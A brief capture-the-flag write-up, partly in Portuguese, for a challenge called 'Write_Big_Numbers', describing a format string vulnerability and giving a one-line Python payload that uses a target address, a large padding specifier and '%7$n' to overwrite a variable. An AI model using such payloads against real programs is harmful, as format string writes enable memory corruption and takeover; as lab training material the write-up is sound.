# Challenge `Write_Big_Numbers` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format Strings
- Where: Where is the vulnerability present
  - Buffer
- Impact: What results of exploiting this vulnerability
  - Mofificar o avalor de uma variavel

## Steps to reproduce

1. queria escrever no endereço do target portanto fiz print &target

2. coloquei o valor hexa 0x0f5f1aa9 em decimal 257890985 e subtrai 4 obtive 257890981d

Payload final: python -c 'print "\x44\xa0\x04\x08"+"%257890981d"+ "%7$n"'
